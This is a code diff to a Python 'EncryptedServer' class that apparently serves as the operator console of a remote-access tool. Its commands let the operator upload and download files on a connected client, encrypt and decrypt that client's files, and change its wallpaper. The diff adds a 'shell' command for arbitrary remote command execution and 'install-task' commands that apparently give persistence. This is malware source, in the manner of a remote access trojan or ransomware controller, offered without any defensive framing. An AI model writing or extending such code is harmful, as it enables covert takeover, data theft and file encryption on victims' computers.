@@ -133,26 +133,26 @@ class EncryptedServer:
 
 
         elif "upload" in command:
-            file_name = command.split(" ")[1]
+            file_name = command[7:]
             self.send_command(file_name)
             time.sleep(0.1)
             self.upload(file_name)
 
         elif "download" in command:
-            file_name = command.split(" ")[1]
+            file_name = command[9:]
             self.send_command(file_name)
             time.sleep(0.1)
             self.download(file_name)
         
         elif "encrypt" in command:
-            file_name = command.split(" ")[1]
+            file_name = command[8:]
             self.send_command(file_name)
             time.sleep(0.1)
             response = self.decrypt(self.conn.recv(1024)).decode()
             print(response)
         
         elif "decrypt" in command:
-            file_name = command.split(" ")[1]
+            file_name = command[8:]
             self.send_command(file_name)
             time.sleep(0.1)
             response = self.decrypt(self.conn.recv(1024)).decode()
@@ -185,7 +185,9 @@ class EncryptedServer:
                     upload <file>           Upload file to client
                     encrypt <file>          Encrypt a file
                     decrypt <file>          Decrypt a file
-                    wall <image>            Change desktop wallpaper
+                    shell <command>         Execute a command
+                    install-task            Install task
+                    uninstall-task          Uninstall task
                     help                    Show this help message
                     close / exit            Terminate session
                 """)
@@ -210,7 +212,9 @@ class EncryptedServer:
                             upload <file>           Upload file to client
                             encrypt <file>          Encrypt a file
                             decrypt <file>          Decrypt a file
-                            wall <image>            Change desktop wallpaper
+                            shell <command>         Execute a command
+                            install-task            Install task
+                            uninstall-task          Uninstall task
                             help                    Show this help message
                             close / exit            Terminate session
                         """)
